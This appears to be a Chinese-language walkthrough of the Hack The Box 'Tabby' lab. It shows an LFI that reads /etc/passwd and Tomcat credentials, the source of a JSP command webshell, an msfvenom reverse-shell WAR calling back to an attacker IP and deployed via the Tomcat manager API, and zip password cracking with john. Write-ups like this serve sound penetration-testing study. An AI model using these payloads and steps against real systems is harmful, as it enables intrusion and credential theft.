```Bash
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat

```

## Http

### 80端口

页面关键字有一些poc不确定是否匹配

```Bash
└─#  searchsploit mega | grep Hosting
Mega File Hosting Script 1.2 - 'emaillinks.php' Cross-Site Scripting                        | php/webapps/33226.txt
Mega File Hosting Script 1.2 - 'fid' SQL Injection                                          | php/webapps/5598.txt
Mega File Hosting Script 1.2 - 'url' Remote File Inclusion                                  | php/webapps/8230.txt

```

目录扫描

```Bash
/news.php             (Status: 200) [Size: 0]
/files                (Status: 301) [Size: 312] [--> http://10.10.10.194/files/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.10.194/assets/]
/index.php            (Status: 200) [Size: 14175]
/server-status        (Status: 403) [Size: 277]

```

```Bash
/archive              (Status: 301) [Size: 320] [--> http://10.10.10.194/files/archive/]
/statement            (Status: 200) [Size: 6507]

```

![](https://secure2.wostatic.cn/static/p1FoPqz9HkQ486exNUyRwc/image.png?auth_key=1677498531-akZ9oHZT42meBJCk9Q8sjY-0-670f28158d6f53ace3bab565d2171e79)

明确当前的页面废弃。另外一个archive目录下全部为301

点击上面的news，看到有域名提示，kali新增hosts后重新访问

![](https://secure2.wostatic.cn/static/j3UynVawxBRZVWHqjKv4hm/image.png?auth_key=1677498531-fJPbyzGMKUUFMVokLzoUjT-0-87529de684658194ad9a2c96272fe1cb)

使用域名重新访问下，对域名进行了扫描，ni。



有个路径存在文件包含，简单探测了下没有结果。

![](https://secure2.wostatic.cn/static/ns2XAJ6UG3zz7A4wA6evpm/image.png?auth_key=1677498531-8weFs5uDoxxWbegtfKG6kc-0-6f47d187521845a445190109bf994d26)



### Tomcat

目录扫描

```Bash
/index.html           (Status: 200) [Size: 1895]
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]

```

![](https://secure2.wostatic.cn/static/49xeUivKvU9upo8nUytZs4/image.png?auth_key=1677498531-8BcJB5zQn5FsAJ1ttMMrud-0-42dc3d69f8cd5f3f48793d8737a9b6ae)

需要进入管理页面，这里的用户名密码放在 config/tomcat-users.xml中，可能是放在上面的archive中，加后缀名再次便利，没有成功

尝试了.gz  .zip .tgz. .bak .backup和jsp

确认版本为9.0.31，查询官方文档，9.31后一个版本修复了RCE [CVE-2020-9484](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484)，找poc试一下

![](https://secure2.wostatic.cn/static/bTnMYzsxhawz6FSNbBB2GA/image.png?auth_key=1677498531-fq72P1reE1cbhcF4LMmthE-0-bf5d819c3105a872f95ebdbedc92e3a0)

[PenTestical/CVE-2020-9484 (github.com)](https://github.com/PenTestical/CVE-2020-9484)  没有成功

没有思路，看下题解

上面文件包含的思路没有问题，LFI但是对回溯的层数有要求，不能随便. 得到用户 ash

```Bash
└─# curl megahosting.htb/news.php?file=../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash

```



这里tomcat-usres.xml的路径并不在 /etc/tomcat9下面，而是在/usr/share中，默认安装tomcat会存在这两个路径

```Bash
└─# curl megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml

```

```Bash
 # 拿到用户名密码信息
 <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>

```

通过host-manager进入控制台



#### 制作恶意的war包

- 工具

[mgeeky/tomcatWarDeployer: Apache Tomcat auto WAR deployment & pwning penetration testing tool. (github.com)](https://github.com/mgeeky/tomcatWarDeployer)

- 手动
    - 写一个jsp

```Bash
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```
    - 打war包

```Bash
┌──(root㉿yOutiao)-[/home/machines/linux/tabby]
└─# mkdir webshell

┌──(root㉿yOutiao)-[/home/machines/linux/tabby]
└─# cp shell.jsp webshell

┌──(root㉿yOutiao)-[/home/machines/linux/tabby]
└─# cd webshell

┌──(root㉿yOutiao)-[/home/machines/linux/tabby/webshell]
└─# jar -cvf ../webshell.war *
added manifest
adding: shell.jsp(in = 579) (out= 351)(deflated 39%)

┌──(root㉿yOutiao)-[/home/machines/linux/tabby/webshell]
└─# cd ..

┌──(root㉿yOutiao)-[/home/machines/linux/tabby]
└─# ll
total 16
drwxr-xr-x 3 root root 4096 Feb 27 14:37 CVE-2020-9484
-rw-r--r-- 1 root root  579 Feb 27 15:23 shell.jsp
drwxr-xr-x 2 root root 4096 Feb 27 15:24 webshell
-rw-r--r-- 1 root root  803 Feb 27 15:24 webshell.war

```
    - 上传war包，这里在host-manager页面下用的是被动上传

    

host-manager的页面没有上传包的功能，这里只能用UNC的方式去操作，可以参考这里，在自己机器上运行smbserver，这个靶机上是用不了的

[Tomcat exploit variant : host-manager | Certilience](https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/)

这里用另外一个方式，有点超纲

#### Text-based manager

只能在命令行下操作

```Bash
#The tomcat user did have another permission, manager-script. This is to allow access to the text-based web service located at /manager/text. There’s a list of commands here.
┌──(root㉿yOutiao)-[/home/machines/linux/tabby]
└─# curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs


```

制作反弹shell的war包

```Bash
┌──(root㉿yOutiao)-[/home/machines/linux/tabby]
└─# msfvenom -p java/shell_reverse_tcp lhost=10.10.16.11 lport=443 -f war -o rev.10.10.16.11-443.war
Payload size: 13316 bytes
Final size of war file: 13316 bytes
Saved as: rev.10.10.16.11-443.war
```

命令行手动上传并指定路径

```Bash
└─# curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/y0utiao --upload-file rev.10.10.16.11-443.war
OK - Deployed application at context path [/y0utiao]

#访问后拿到shell

┌──(root㉿yOutiao)-[/home/machines/linux/tabby]
└─# curl http://10.10.10.194:8080/y0utiao

```



## Privilege Escalation

### tomcat →  ash

web 目录下有一个ash所属的zip文件

```Bash
tomcat@tabby:/var/www/html/files$ ls -lha
total 36K
drwxr-xr-x 4 ash  ash  4.0K Aug 19  2021 .
drwxr-xr-x 4 root root 4.0K Aug 19  2021 ..
-rw-r--r-- 1 ash  ash  8.6K Jun 16  2020 16162020_backup.zip
drwxr-xr-x 2 root root 4.0K Aug 19  2021 archive
drwxr-xr-x 2 root root 4.0K Aug 19  2021 revoked_certs
-rw-r--r-- 1 root root 6.4K Jun 16  2020 statement

```

拿到kali上解压需要密码，用zip2john试下拿到密码成功解压

```Bash
┌──(root㉿yOutiao)-[/home/machines/linux/tabby]
└─# zip2john ash.zip 2>/dev/null | tee ash.zip.hash
ash.zip:$pkzip$5*1*1*0*8*24*7db5*dd84cfff4c26e855919708e34b3a32adc4d5c1a0f2a24b1e59be93f3641b254fde4da84c*1*0*8*24*6a8b*32010e3d24c744ea56561bbf91c0d4e22f9a300fcf01562f6fcf5c986924e5a6f6138334*1*0*0*24*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip$::ash.zip:var/www/html/news.php, var/www/html/favicon.ico, var/www/html/Readme.txt, var/www/html/logo.png, var/www/html/index.php:ash.zip

┌──(root㉿yOutiao)-[/home/machines/linux/tabby]
└─# ll
total 52
-rw-r--r-- 1 root root  8716 Feb 27 16:39 ash.zip
-rw-r--r-- 1 root root   779 Feb 27 16:43 ash.zip.hash
drwxr-xr-x 3 root root  4096 Feb 27 14:37 CVE-2020-9484
-rw-r--r-- 1 root root 13316 Feb 27 15:53 rev.10.10.16.11-443.war
-rw-r--r-- 1 root root   579 Feb 27 15:23 shell.jsp
drwxr-xr-x 3 root root  4096 Feb 27 16:39 var
drwxr-xr-x 2 root root  4096 Feb 27 15:24 webshell
-rw-r--r-- 1 root root   803 Feb 27 15:24 webshell.war

┌──(root㉿yOutiao)-[/home/machines/linux/tabby]
└─# john ash.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (ash.zip)
1g 0:00:00:01 DONE (2023-02-27 16:44) 0.6944g/s 7193Kp/s 7193Kc/s 7193KC/s adornadis..adj071007
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(root㉿yOutiao)-[/home/machines/linux/tabby]
└─# unzip  ash.zip
Archive:  ash.zip
[ash.zip] var/www/html/favicon.ico password:
  inflating: var/www/html/favicon.ico
  inflating: var/www/html/index.php
 extracting: var/www/html/logo.png
  inflating: var/www/html/news.php
  inflating: var/www/html/Readme.txt

```

这个目录里面没有找到有用信息，原来拿到的这个密码就是su密码。。。





### ash → root

LinEnum

没有特别发现，ssh允许了root登录

这里用到lxc提权，参考lxc的记录

